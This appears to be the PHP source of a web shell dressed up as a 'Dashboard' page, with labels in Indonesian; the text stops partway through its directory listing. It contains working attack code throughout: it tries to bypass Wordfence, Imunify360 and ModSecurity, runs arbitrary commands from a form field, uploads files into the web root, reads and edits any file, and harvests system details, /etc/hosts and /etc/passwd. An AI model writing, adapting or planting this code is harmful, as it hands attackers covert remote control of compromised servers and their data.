<!DOCTYPE html>
<html lang="id">
<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
   <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
   <title>Dashboard - <?php echo $_SERVER['HTTP_HOST']; ?></title>
</head>
<body class="container py-4">
<?php
error_reporting(0);
session_start();
ob_start();
if (function_exists('litespeed_request_headers')) {
   $a = litespeed_request_headers();
   if (isset($a['X-LSCACHE'])) {
       header('X-LSCACHE: off');
   }
}

if (defined('WORDFENCE_VERSION')) {
   define('WORDFENCE_DISABLE_LIVE_TRAFFIC', true);
   define('WORDFENCE_DISABLE_FILE_MODS', true);
}

if (function_exists('imunify360_request_headers') && defined('IMUNIFY360_VERSION')) {
   $a = imunify360_request_headers();
   if (isset($a['X-Imunify360-Request'])) {
       header('X-Imunify360-Request: bypass');
   }
   
   if (isset($a['X-Imunify360-Captcha-Bypass'])) {
       header('X-Imunify360-Captcha-Bypass: ' . $a['X-Imunify360-Captcha-Bypass']);
   }
}

if (function_exists('apache_request_headers')) {
   $a = apache_request_headers();
   if (isset($a['X-Mod-Security'])) {
       header('X-Mod-Security: ' . $a['X-Mod-Security']);
   }
}

if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
   $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
   if (isset($a['HTTP_CF_VISITOR'])) {
       header('HTTP_CF_VISITOR: ' . $a['HTTP_CF_VISITOR']);
   }
}
function detectOS() {
   if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
       return "Windows";
   } else {
       return "Linux";
   }
}
function formatSize($file) {
   if (!file_exists($file) || !is_readable($file)) return 'N/A';
   $bytes = filesize($file);
   if ($bytes == 0) return '0 B';
   $sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
   $factor = floor((strlen($bytes) - 1) / 3);
   return sprintf("%.2f", $bytes / pow(1024, $factor)) . " " . $sizes[$factor];
}
function exe($cmd) {
    // Jika $cmd adalah file, baca isinya
    if(is_file($cmd)) {
        $buff = @file_get_contents($cmd);
        return htmlspecialchars($buff);
    }

    if(function_exists('system')) {     
        @ob_start();      
        @system($cmd);       
        $buff = @ob_get_contents();      
        @ob_end_clean();        
        return htmlspecialchars($buff);    
    } elseif(function_exists('exec')) {      
        @exec($cmd,$results);      
        $buff = "";      
        foreach($results as $result) {          
            $buff .= $result;      
        } 
        return htmlspecialchars($buff);    
    } elseif(function_exists('passthru')) {     
        @ob_start();      
        @passthru($cmd);      
        $buff = @ob_get_contents();      
        @ob_end_clean();      
        return $buff;    
    } elseif(function_exists('shell_exec')) {     
        $buff = @shell_exec($cmd);      
        return htmlspecialchars($buff);    
    } 

    return false; // Jika tidak ada fungsi yang tersedia
}
function deleteDirectory($dir) {
   if (!is_dir($dir)) return false;
   
   $files = array_diff(scandir($dir), array('.', '..'));
   foreach ($files as $file) {
       $filePath = "$dir/$file";
       is_dir($filePath) ? deleteDirectory($filePath) : unlink($filePath);
   }
   
   return rmdir($dir);
}
function w($dir,$perm) {
  if(!is_writable($dir)) {
     return "<font color=red>".$perm."</font>";
  } else {
     return "<font color=lime>".$perm."</font>";
  }
}
function r($dir,$perm) {
  if(!is_readable($dir)) {
     return "<font color=red>".$perm."</font>";
  } else {
     return "<font color=lime>".$perm."</font>";
  }
}
function perms($file){
  $perms = fileperms($file);
  if (($perms & 0xC000) == 0xC000) {
  $info = 's';
  } elseif (($perms & 0xA000) == 0xA000) {
  $info = 'l';
  } elseif (($perms & 0x8000) == 0x8000) {
  $info = '-';
  } elseif (($perms & 0x6000) == 0x6000) {
  $info = 'b';
  } elseif (($perms & 0x4000) == 0x4000) {
  $info = 'd';
  } elseif (($perms & 0x2000) == 0x2000) {
  $info = 'c';
  } elseif (($perms & 0x1000) == 0x1000) {
  $info = 'p';
  } else {
  $info = 'u';
  }
  $info .= (($perms & 0x0100) ? 'r' : '-');
  $info .= (($perms & 0x0080) ? 'w' : '-');
  $info .= (($perms & 0x0040) ?
  (($perms & 0x0800) ? 's' : 'x' ) :
  (($perms & 0x0800) ? 'S' : '-'));
  $info .= (($perms & 0x0020) ? 'r' : '-');
  $info .= (($perms & 0x0010) ? 'w' : '-');
  $info .= (($perms & 0x0008) ?
  (($perms & 0x0400) ? 's' : 'x' ) :
  (($perms & 0x0400) ? 'S' : '-'));
  $info .= (($perms & 0x0004) ? 'r' : '-');
  $info .= (($perms & 0x0002) ? 'w' : '-');
  $info .= (($perms & 0x0001) ?
  (($perms & 0x0200) ? 't' : 'x' ) :
  (($perms & 0x0200) ? 'T' : '-'));
  return $info;
}
function hdd($s) {
  if($s >= 1073741824)
  return sprintf('%1.2f',$s / 1073741824 ).' GB';
  elseif($s >= 1048576)
  return sprintf('%1.2f',$s / 1048576 ) .' MB';
  elseif($s >= 1024)
  return sprintf('%1.2f',$s / 1024 ) .' KB';
  else
  return $s .' B';
}
if(isset($_GET['dir'])) {
  $dir = $_GET['dir'];
  chdir($dir);
} else {
  $dir = getcwd();
}

function checkStatus($condition) {
   return $condition ? '<span class="text-success fw-bold">ON</span>' : '<span class="text-danger fw-bold">OFF</span>';
}

function getMyIP() {
   $ch = curl_init('https://api64.ipify.org');
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
   $ip = curl_exec($ch);
   curl_close($ch);
   return $ip ? $ip : 'Tidak Diketahui';
}

$os = detectOS();
$kernel = php_uname();
$ip_server = gethostbyname($_SERVER['HTTP_HOST']);
$ip_user = getMyIP();

$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$freespace = hdd(disk_free_space("/"));
$total = hdd(disk_total_space("/"));
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=lime>OFF</font>";
$ds = @ini_get("disable_functions");
$curl = (function_exists('curl_version')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$show_ds = (!empty($ds)) ? $ds: "NONE";


if(!function_exists('posix_getegid')) {
  $user = @get_current_user();
  $uid = @getmyuid();
  $gid = @getmygid();
  $group = "?";
} else {
  $uid = @posix_getpwuid(posix_geteuid());
  $gid = @posix_getgrgid(posix_getegid());
  $user = $uid['name'];
  $uid = $uid['uid'];
  $group = $gid['name'];
  $gid = $gid['gid'];
}
echo "<hr>";
echo '
<div class="container mt-4">
   <!-- Pilihan Navigasi -->
   <div class="mb-3 d-flex gap-2">
       <a href="' . basename($_SERVER['PHP_SELF']) . '" class="btn btn-sm btn-warning">
           <i class="bi bi-house-door-fill"></i> Home
       </a>
       <a href="?dir='.$dir.'&do=system" class="btn btn-sm btn-warning">
           <i class="bi bi-info-circle"></i> System Info
       </a>
       <a href="?dir='.$dir.'&do=upload" class="btn btn-sm btn-warning">
           <i class="bi bi-upload"></i> Upload
       </a>
       <a href="?dir='.$dir.'&do=cmd" class="btn btn-sm btn-warning">
           <i class="bi bi-terminal"></i> Command
       </a>
       <a href="?logout=true" class="btn btn-sm btn-danger">
           <i class="bi bi-box-arrow-right"></i> Logout
       </a>
   </div>';
echo "<hr>";
$php_version = PHP_VERSION;
$safe_mode = (@ini_get("safe_mode") == 'on') ? '<span class="text-danger">OFF</span>' : '<span class="text-success">ON</span>';
$magic_quotes = (function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()) ? '<span class="text-success">ON</span>' : '<span class="text-danger">OFF</span>';
$mysql = (function_exists('mysqli_connect')) ? '<span class="text-success">ON</span>' : '<span class="text-danger">OFF</span>';
$mssql = (function_exists('mssql_connect')) ? '<span class="text-success">ON</span>' : '<span class="text-danger">OFF</span>';
$pgsql = (function_exists('pg_connect')) ? '<span class="text-success">ON</span>' : '<span class="text-danger">OFF</span>';
$oracle = (function_exists('oci_connect')) ? '<span class="text-success">ON</span>' : '<span class="text-danger">OFF</span>';
$exec = (function_exists('exec')) ? '<span class="text-success">ON</span>' : '<span class="text-danger">OFF</span>';
$open_basedir = (ini_get("open_basedir")) ? '<span class="text-danger">ON</span>' : '<span class="text-success">OFF</span>';
$ini_restore = (function_exists('ini_restore')) ? '<span class="text-success">ON</span>' : '<span class="text-danger">OFF</span>';
$symlink = (function_exists('symlink')) ? '<span class="text-success">ON</span>' : '<span class="text-danger">OFF</span>';
$file_get_contents = (function_exists('file_get_contents')) ? '<span class="text-success">ON</span>' : '<span class="text-danger">OFF</span>';
echo '<div class="mb-3">';
if (PHP_OS_FAMILY === "Windows") {
   $drives = "";
   foreach (range('A', 'Z') as $drive) {
      if (is_dir($drive . ':\\')) {
         $drives .= '<a href="?dir=' . $drive . ':/" class="btn btn-outline-primary btn-sm">[ ' . $drive . ' ]</a> ';
      }
   }
   echo '<strong>Disk:</strong>
       <div class="d-inline-flex flex-wrap gap-2">';
   echo $drives . '</div>&nbsp; - &nbsp;';
}
echo '<strong>Current DIR:</strong> ';
foreach ($scdir as $c_dir => $cdir) {
   echo '<a href="?dir=';
   for ($i = 0; $i <= $c_dir; $i++) {
       echo $scdir[$i];
       if ($i != $c_dir) {
           echo "/";
       }
   }
   echo '" class="text-decoration-none text-primary fw-bold me-1">' . $cdir . '</a>/';
}
echo '&nbsp;&nbsp;<span class="badge bg-secondary">' . w($dir, perms($dir)) . '</span>';
echo '</div>
</div>';
echo "<hr>";
if($_GET['logout'] == true) {
	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	echo "<script>window.location='?';</script>";
}
elseif($_GET['do'] == 'system') {
   echo '<div class="container mt-4">
      <h4 class="mb-3 text-primary">System Information</h4>
      <table class="table table-bordered">
         <tbody>
               <tr><td><strong>OS</strong></td><td>' . $os . '</td></tr>
               <tr><td><strong>Kernel</strong></td><td>' . $kernel . '</td></tr>
               <tr><td><strong>Server</strong></td><td>' . $_SERVER['SERVER_SOFTWARE'] . '</td></tr>
               <tr><td><strong>PHP Version</strong></td><td>' . $php_version . '</td></tr>
               <tr><td><strong>Safe Mode</strong></td><td>' . $safe_mode . '</td></tr>
               <tr><td><strong>Magic Quotes GPC</strong></td><td>' . $magic_quotes . '</td></tr>
               <tr><td><strong>Open Basedir</strong></td><td>' . $open_basedir . '</td></tr>
               <tr><td><strong>Ini Restore</strong></td><td>' . $ini_restore . '</td></tr>
               <tr><td><strong>Exec</strong></td><td>' . $exec . '</td></tr>
               <tr><td><strong>Symlink</strong></td><td>' . $symlink . '</td></tr>
               <tr><td><strong>File Get Contents</strong></td><td>' . $file_get_contents . '</td></tr>
               <tr><td><strong>MySQL</strong></td><td>' . $mysql . '</td></tr>
               <tr><td><strong>MSSQL</strong></td><td>' . $mssql . '</td></tr>
               <tr><td><strong>PostgreSQL</strong></td><td>' . $pgsql . '</td></tr>
               <tr><td><strong>Oracle</strong></td><td>' . $oracle . '</td></tr>
               <tr><td><strong>cURL</strong></td><td>' . $curl . '</td></tr>
               <tr><td><strong>Wget</strong></td><td>' . $wget . '</td></tr>
               <tr><td><strong>Perl</strong></td><td>' . $perl . '</td></tr>
               <tr><td><strong>Python</strong></td><td>' . $python . '</td></tr>
               <tr><td><strong>IP Server</strong></td><td>' . $ip_server . '</td></tr>
               <tr><td><strong>My IP</strong></td><td>' . $_SERVER['REMOTE_ADDR'] . '</td></tr>
               <tr><td><strong>HDD Free Space</strong></td><td>' . $freespace . '</td></tr>
               <tr><td><strong>HDD Total Space</strong></td><td>' . $total . '</td></tr>
               <tr><td><strong>Disabled PHP Functions</strong></td><td><textarea class="form-control bg-light" rows="1" readonly>' . $show_ds . '</textarea></td></tr>
         </tbody>
      </table>
   </div>';
   // Tambahan untuk Windows
   if ($os == 'Windows') {
      echo '<div class="container mt-4">
         <h4 class="mb-3 text-primary">Windows System Information</h4>
         <table class="table table-bordered">
            <tbody>
                  <tr><td><strong>Server Software</strong></td><td>' . $_SERVER['SERVER_SOFTWARE'] . '</td></tr>
                  <tr><td><strong>Loaded Apache Modules</strong></td><td>' . implode(", ", apache_get_modules()) . '</td></tr>
            </tbody>
         </table>
      </div>';
      $account_settings = exe('net accounts');
      echo '<div class="container mt-4">
         <h4 class="mb-3 text-primary">Windows Account Settings</h4>
         <pre class="border p-3 bg-light">' . $account_settings . '</pre>
      </div>';
      $account_user = exe('net user');
      echo '<div class="container mt-4">
         <h4 class="mb-3 text-primary">User Accounts</h4>
         <pre class="border p-3 bg-light">' . $account_user . '</pre>
      </div>';
   }

   // Tambahan untuk Linux
   if ($os == 'Linux') {
      $userful = exe('command -v gcc cc ld make php perl tar gzip bzip2 nc');
      $downloaders = exe('command -v wget curl lwp-mirror');
      $hdd_space = exe('df -h');
      $hosts = exe('cat /etc/hosts');
      $passwd_content = "File /etc/passwd tidak dapat dibaca!";
      echo '<div class="container mt-4">
         <h4 class="mb-3 text-primary">Linux System Information</h4>
         <table class="table table-bordered">
               <tbody>
                  <tr><td><strong>OS Version</strong></td><td>' . exe('lsb_release -ds') . '</td></tr>
                  <tr><td><strong>Distribusi</strong></td><td>' . exe('cat /etc/issue') . '</td></tr>
                  <tr><td><strong>User Accounts</strong></td><td>' . exe('whoami') . '</td></tr>
                  <tr><td><strong>Userful Tools</strong></td><td><pre class="bg-light p-2">' . $userful . '</pre></td></tr>
                  <tr><td><strong>Downloaders</strong></td><td><pre class="bg-light p-2">' . $downloaders . '</pre></td></tr>
                  <tr><td><strong>HDD Space</strong></td><td><pre class="bg-light p-2">' . $hdd_space . '</pre></td></tr>
                  <tr><td><strong>Hosts</strong></td><td><pre class="bg-light p-2">' . $hosts . '</pre></td></tr>
                  <tr><td><strong>Readable /etc/passwd</strong></td><td>';
                  if (is_readable('/etc/passwd')) {
                     echo '<a href="?act=view&file=/etc/passwd" class="btn btn-sm btn-outline-info">View</a>';
                  } else {
                     echo '<span class="text-danger fw-bold">NO</span>';
                  }
                  echo '</td></tr>
               </tbody>
         </table>
      </div>';
   }
}
elseif($_GET['do'] == 'upload') {
   echo '
   <div class="container mt-4">
      <form method="post" enctype="multipart/form-data" class="p-3 border rounded bg-light">
         <div class="mb-3">
            <label class="form-label">Pilih Lokasi Upload:</label>
            <div class="d-flex gap-3">
                  <div class="form-check form-check-inline">
                     <input class="form-check-input" type="radio" name="tipe_upload" value="biasa" checked>
                     <label class="form-check-label">
                        Biasa [ ' . w($dir, "Writeable") . ' ]
                     </label>
                  </div>
                  <div class="form-check form-check-inline">
                     <input class="form-check-input" type="radio" name="tipe_upload" value="home_root">
                     <label class="form-check-label">
                        home_root [ ' . w($_SERVER["DOCUMENT_ROOT"], "Writeable") . ' ]
                     </label>
                  </div>
            </div>
         </div>
         <div class="mb-3">
            <input type="file" name="ix_file" class="form-control">
         </div>
         <button type="submit" name="upload" class="btn btn-primary">
            <i class="bi bi-upload"></i> Upload
         </button>
      </form>
   </div>';
   if(isset($_POST['upload'])) {
      if($_POST['tipe_upload'] == 'biasa') {
         if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
            $act = "<font color=lime>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
         } else {
            $act = "<font color=red>failed to upload file</font>";
         }
      } else {
         $root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['ix_file']['name'];
         $web = $_SERVER['HTTP_HOST']."/".$_FILES['ix_file']['name'];
         if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
            if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
                  $act = "<font color=lime>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
            } else {
                  $act = "<font color=red>failed to upload file</font>";
            }
         } else {
            $act = "<font color=red>failed to upload file</font>";
         }
      }
      echo $act;
   }
}
elseif($_GET['do'] == 'cmd') {
   echo "<form method='post'>
   <div class='input-group mb-2'>
   <input type='text' class='form-control' name='cmd' placeholder='".$user."@".$ip.": ~ $'>
   <button type='submit' class='btn btn-dark' name='do_cmd'><i class='bi bi-terminal'></i> Jalankan</button>
   </div>
   </form>";
   if(isset($_POST['do_cmd'])) {
      echo "
   <div class='mb-3'>
      <label class='form-label fw-bold'>Hasil Data:</label>
      <textarea class='form-control bg-light' rows='10' readonly>".exe($_POST['cmd'])."</textarea>
   </div>";
   }
}
elseif (isset($_GET['file']) && !empty($_GET['file']) && isset($_GET['act']) && $_GET['act'] == 'download') {
   $file = basename($_GET['file']);
   $filePath = __DIR__ . '/' . $file;

   if (file_exists($filePath)) {
       ob_end_clean();
       header('Content-Description: File Transfer');
       header('Content-Type: application/octet-stream');
       header('Content-Disposition: attachment; filename="' . basename($filePath) . '"');
       header('Expires: 0');
       header('Cache-Control: must-revalidate');
       header('Pragma: public');
       header('Content-Length: ' . filesize($filePath));
       readfile($filePath);
       exit;
   } else {
       die("<div class='alert alert-danger'>Error: File tidak ditemukan!</div>");
   }
}
elseif(isset($_GET['act']) && $_GET['act'] == 'newfile') {
  if(isset($_POST['new_save_file'])) {
     $newfile = htmlspecialchars($_POST['newfile']);
     $fopen = fopen($newfile, "a+");
     if($fopen) {
        $act = "<script>window.location='?act=edit&dir=".$dir."&file=".$_POST['newfile']."';</script>";
     } else {
        $act = "<font color=red>permission denied</font>";
     }
       echo $act;
  }
  echo '
<div class="container mt-4">
   <h4 class="mb-3">Buat File Baru</h4>
   
   <form method="post">
       <div class="input-group mb-3">
           <span class="input-group-text"><i class="bi bi-file-earmark-plus"></i></span>
           <input type="text" name="newfile" value="newfile.php" class="form-control" placeholder="Nama file..." required>
           <button type="submit" name="new_save_file" class="btn btn-success"><i class="bi bi-plus-lg"></i> Buat File</button>
       </div>
   </form>
</div>';
} elseif(isset($_GET['act']) && $_GET['act'] == 'newfolder') {
  if(isset($_POST['new_save_folder'])) {
     $new_folder = $dir.'/'.htmlspecialchars($_POST['newfolder']);
     if(!mkdir($new_folder)) {
        $act = "<font color=red>permission denied</font>";
     } else {
        $act = "<script>window.location='?dir=".$dir."';</script>";
     }
       echo $act;
  }
  echo '
<div class="container mt-4">
   <h4 class="mb-3">Buat Folder Baru</h4>

   <form method="post">
       <div class="input-group mb-3">
           <span class="input-group-text"><i class="bi bi-folder-plus"></i></span>
           <input type="text" name="newfolder" class="form-control" placeholder="Nama Folder Baru" required>
           <button type="submit" class="btn btn-primary" name="new_save_folder">
               <i class="bi bi-plus-lg"></i> Buat Folder
           </button>
       </div>
   </form>
</div>';
} elseif(isset($_GET['act']) && $_GET['act'] == 'rename_dir') {
  if(isset($_POST['dir_rename'])) {
     $dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
     if($dir_rename) {
        $act = "<script>window.location='?dir=".dirname($dir)."';</script>";
     } else {
        $act = "<font color=red>permission denied</font>";
     }
  echo "".$act."<br>";
  }
echo '
<div class="container mt-4">
   <h4 class="mb-3">Ubah Nama Folder</h4>
   
   <form method="post">
       <div class="input-group mb-3">
           <span class="input-group-text"><i class="bi bi-folder"></i></span>
           <input type="text" value="' . basename($dir) . '" class="form-control" readonly>
           <input type="text" name="fol_rename" class="form-control" placeholder="Nama Baru" required>
           <button type="submit" class="btn btn-primary" name="dir_rename">
               <i class="bi bi-pencil-square"></i> Ubah Nama
           </button>
       </div>
   </form>
</div>';
} elseif(isset($_GET['act']) && $_GET['act'] == 'delete_dir') {
  if(is_dir($dir)) {
     if(is_writable($dir)) {
        @rmdir($dir);
        @exe("rm -rf $dir");
        @exe("rmdir /s /q $dir");
        $act = "<script>window.location='?dir=".dirname($dir)."';</script>";
     } else {
        $act = "<font color=red>could not remove ".basename($dir)."</font>";
     }
  }
  echo $act;
} elseif(isset($_GET['act']) && $_GET['act'] == 'view') {
  echo '<div class="container mt-4">
   <h4 class="mb-3">File: <span class="text-success">' . htmlspecialchars(basename($_GET['file'])) . '</span></h4>
   
   <div class="btn-group mb-3" role="group">
       <a href="?act=view&dir=' . $dir . '&file=' . $_GET['file'] . '" class="btn btn-outline-primary btn-sm"><i class="bi bi-eye"></i> View</a>
       <a href="?act=edit&dir=' . $dir . '&file=' . $_GET['file'] . '" class="btn btn-outline-warning btn-sm"><i class="bi bi-pencil-square"></i> Edit</a>
       <a href="?act=rename&dir=' . $dir . '&file=' . $_GET['file'] . '" class="btn btn-outline-info btn-sm"><i class="bi bi-pencil"></i> Rename</a>
       <a href="?act=download&dir=' . $dir . '&file=' . $_GET['file'] . '" class="btn btn-outline-success btn-sm"><i class="bi bi-download"></i> Download</a>
       <a href="?act=delete&dir=' . $dir . '&file=' . $_GET['file'] . '" class="btn btn-outline-danger btn-sm"><i class="bi bi-trash"></i> Delete</a>
   </div>

   <textarea class="form-control" rows="10" readonly>' . htmlspecialchars(@file_get_contents($_GET['file'])) . '</textarea>
</div>';
} elseif (isset($_GET['file']) && !empty($_GET['file']) && isset($_GET['act']) && $_GET['act'] == 'chmod_file') {
   $file = $_GET['file'];
   $dir = $_GET['dir'] ?? dirname($file);
   $current_perm = substr(sprintf('%o', fileperms($file)), -4); // Ambil permission saat ini dalam format oktal

   if (isset($_POST['new_perm'])) {
       $new_perm = $_POST['new_perm'];

       if (preg_match('/^[0-7]{3}$/', $new_perm)) { // Validasi izin harus dalam format oktal 3 digit
           $chmod_result = chmod($file, octdec($new_perm));
           $msg = $chmod_result ? "<span class='text-success'>✅ Permission berhasil diubah menjadi $new_perm!</span>" : "<span class='text-danger'>❌ Gagal mengubah permission!</span>";
           $current_perm = substr(sprintf('%o', fileperms($file)), -4); // Update permission setelah chmod
       } else {
           $msg = "<span class='text-danger'>âš ï¸ Format permission tidak valid! Gunakan format 3 digit (misal: 755).</span>";
       }
   }

   echo '<div class="container mt-4">';
   echo '<h3>🛠  Ganti Permission (chmod) File</h3>';
   echo isset($msg) ? "<p>$msg</p>" : "";
   echo '<p>📂 <strong>File:</strong> ' . htmlspecialchars($file) . '</p>';
   echo '<p>📍 <strong>Path:</strong> ' . htmlspecialchars($dir) . '</p>';
   echo '<p>🔑 <strong>Permission Saat Ini:</strong> <code>' . $current_perm . '</code></p>';
   echo '<form method="POST">';
   echo '<label for="new_perm">🔄 Ubah Permission:</label>';
   echo '<input type="text" name="new_perm" id="new_perm" class="form-control mb-2" placeholder="755" required>';
   echo '<button type="submit" class="btn btn-primary">✅ Ubah Permission</button>';
   echo '</form>';
   echo '<br><a href="?dir=' . urlencode($dir) . '" class="btn btn-secondary">🔙 Kembali</a>';
   echo '</div>';
} elseif (isset($_GET['dir']) && !empty($_GET['dir']) && isset($_GET['act']) && $_GET['act'] == 'chmod_dir') {
   $dir = $_GET['dir'];
   $current_perm = substr(sprintf('%o', fileperms($dir)), -4);

   if (isset($_POST['new_perm'])) {
       $new_perm = $_POST['new_perm'];

       if (preg_match('/^[0-7]{3}$/', $new_perm)) {
           $chmod_result = chmod($dir, octdec($new_perm));
           $msg = $chmod_result ? "<span class='text-success'>✅ Permission berhasil diubah menjadi $new_perm!</span>" : "<span class='text-danger'>❌ Gagal mengubah permission!</span>";
           $current_perm = substr(sprintf('%o', fileperms($dir)), -4);
       } else {
           $msg = "<span class='text-danger'>âš ï¸ Format permission tidak valid! Gunakan format 3 digit (misal: 755).</span>";
       }
   }

   echo '<div class="container mt-4">';
   echo '<h3>🛠  Ganti Permission (chmod) Direktori</h3>';
   echo isset($msg) ? "<p>$msg</p>" : "";
   echo '<p>📂 <strong>Direktori:</strong> ' . htmlspecialchars($dir) . '</p>';
   echo '<p>🔑 <strong>Permission Saat Ini:</strong> <code>' . $current_perm . '</code></p>';
   echo '<form method="POST">';
   echo '<label for="new_perm">🔄 Ubah Permission:</label>';
   echo '<input type="text" name="new_perm" id="new_perm" class="form-control mb-2" placeholder="755" required>';
   echo '<button type="submit" class="btn btn-primary">✅ Ubah Permission</button>';
   echo '</form>';
   echo '<br><a href="?dir=' . urlencode($dir) . '" class="btn btn-secondary">🔙 Kembali</a>';
   echo '</div>';
} elseif(isset($_GET['act']) && $_GET['act'] == 'edit') {
  if (isset($_POST['save'])) {
       $save = file_put_contents($_GET['file'], $_POST['src']);
       if ($save) {
           $act = '<div class="alert alert-success" role="alert">✅ File berhasil disimpan!</div>';
       } else {
           $act = '<div class="alert alert-danger" role="alert">❍ Permission Denied!</div>';
       }
       echo $act;
   }
   
   echo '<div class="container mt-4">
       <h4 class="mb-3">File: <span class="text-success">' . htmlspecialchars(basename($_GET['file'])) . '</span></h4>
   
       <div class="btn-group mb-3" role="group">
           <a href="?act=view&dir=' . $dir . '&file=' . $_GET['file'] . '" class="btn btn-outline-primary btn-sm"><i class="bi bi-eye"></i> View</a>
           <a href="?act=edit&dir=' . $dir . '&file=' . $_GET['file'] . '" class="btn btn-outline-warning btn-sm"><i class="bi bi-pencil-square"></i> Edit</a>
           <a href="?act=rename&dir=' . $dir . '&file=' . $_GET['file'] . '" class="btn btn-outline-info btn-sm"><i class="bi bi-pencil"></i> Rename</a>
           <a href="?act=download&dir=' . $dir . '&file=' . $_GET['file'] . '" class="btn btn-outline-success btn-sm"><i class="bi bi-download"></i> Download</a>
           <a href="?act=delete&dir=' . $dir . '&file=' . $_GET['file'] . '" class="btn btn-outline-danger btn-sm"><i class="bi bi-trash"></i> Delete</a>
       </div>
   
       <form method="post">
           <div class="mb-3">
               <textarea name="src" class="form-control" rows="10">' . htmlspecialchars(@file_get_contents($_GET['file'])) . '</textarea>
           </div>
           <button type="submit" name="save" class="btn btn-primary w-100"><i class="bi bi-save"></i> Save</button>
       </form>
   </div>';
} elseif(isset($_GET['act']) && $_GET['act'] == 'rename') {
  if (isset($_POST['do_rename'])) {
       $new_name = htmlspecialchars($_POST['rename']);
       $rename = rename($_GET['file'], "$dir/$new_name");
   
       if ($rename) {
           echo "<script>window.location='?dir=" . urlencode($dir) . "';</script>";
           exit;
       } else {
           echo '<div class="alert alert-danger" role="alert">❍ Permission Denied!</div>';
       }
   }
   
   echo '<div class="container mt-4">
       <h4 class="mb-3">Rename File</h4>
       
       <div class="btn-group mb-3" role="group">
           <a href="?act=view&dir=' . urlencode($dir) . '&file=' . urlencode($_GET['file']) . '" class="btn btn-outline-primary btn-sm"><i class="bi bi-eye"></i> View</a>
           <a href="?act=edit&dir=' . urlencode($dir) . '&file=' . urlencode($_GET['file']) . '" class="btn btn-outline-warning btn-sm"><i class="bi bi-pencil-square"></i> Edit</a>
           <a href="?act=rename&dir=' . urlencode($dir) . '&file=' . urlencode($_GET['file']) . '" class="btn btn-outline-info btn-sm"><i class="bi bi-pencil"></i> Rename</a>
           <a href="?act=download&dir=' . urlencode($dir) . '&file=' . urlencode($_GET['file']) . '" class="btn btn-outline-success btn-sm"><i class="bi bi-download"></i> Download</a>
           <a href="?act=delete&dir=' . urlencode($dir) . '&file=' . urlencode($_GET['file']) . '" class="btn btn-outline-danger btn-sm"><i class="bi bi-trash"></i> Delete</a>
       </div>
   
       <form method="post" class="mb-3">
           <div class="mb-3">
               <label for="rename" class="form-label">New File Name:</label>
               <input type="text" name="rename" id="rename" value="' . htmlspecialchars(basename($_GET['file'])) . '" class="form-control" required>
           </div>
           <button type="submit" name="do_rename" class="btn btn-primary w-100"><i class="bi bi-arrow-right-circle"></i> Rename</button>
       </form>
   </div>';
} elseif(isset($_GET['act']) && $_GET['act'] == 'delete') {
  $delete = unlink($_GET['file']);
  if($delete) {
     $act = "<script>window.location='?dir=".$dir."';</script>";
  } else {
     $act = "<font color=red>permission denied</font>";
  }
  echo $act;
}
else {
  if(is_dir($dir) === true) {
     if(!is_readable($dir)) {
        echo "<font color=red>can't open directory. ( not readable )</font>";
     } else {
        echo '<table class="table table-striped">
        <tr>
        <th>Name</th>
        <th>Type</th>
        <th>Size</th>
        <th>Last Modified</th>
        <th>Owner/Group</th>
        <th>Permission</th>
        <th>Action</th>
        </tr>';
        $scandir = scandir($dir);
        foreach($scandir as $dirx) {
           $dtype = @filetype("$dir/$dirx");
           $dtime = date("F d Y g:i:s", @filemtime("$dir/$dirx"));
           if(function_exists('posix_getpwuid')) {
              $downer = @posix_getpwuid(fileowner("$dir/$dirx"));
              $downer = $downer['name'];
           } else {
              $downer = $uid;
              $downer = @fileowner("$dir/$dirx");
           }
           if(function_exists('posix_getgrgid')) {
              $dgrp = @posix_getgrgid(filegroup("$dir/$dirx"));
              $dgrp = $dgrp['name'];
           } else {
              $dgrp = @filegroup("$dir/$dirx");
           }
            if(!is_dir("$dir/$dirx")) continue;
            if($dirx === '..') {
               $href = "<a href='?dir=".dirname($dir)."' class='text-decoration-none'>$dirx</a>";
            } elseif($dirx === '.') {
               $href = "<a href='?dir=$dir' class='text-decoration-none'>$dirx</a>";
            } else {
               $href = "<a href='?dir=$dir/$dirx' class='text-decoration-none'>$dirx</a>";
            }
            if($dirx === '.' || $dirx === '..') {
               $act_dir = "
   <a href='?act=newfile&dir=$dir' class='btn btn-primary btn-sm'>
       <i class='bi bi-file-earmark-plus'></i> New File
   </a> 
   <a href='?act=newfolder&dir=$dir' class='btn btn-success btn-sm'>
       <i class='bi bi-folder-plus'></i> New Folder
   </a>";
               } else {
                       $act_dir = "<a href='?act=rename_dir&dir=$dir/$dirx'><button class='btn btn-warning btn-sm'>Rename</button></a> | <a href='?act=delete_dir&dir=$dir/$dirx'><button class='btn btn-danger btn-sm'>Delete</button></a>";
            }
            echo "<tr>";
            echo "<td><i class='bi bi-folder'></i> $href</td>";
           echo "<td>$dtype</td>";
           echo "<td>-</th></td>";
           echo "<td>$dtime</td>";
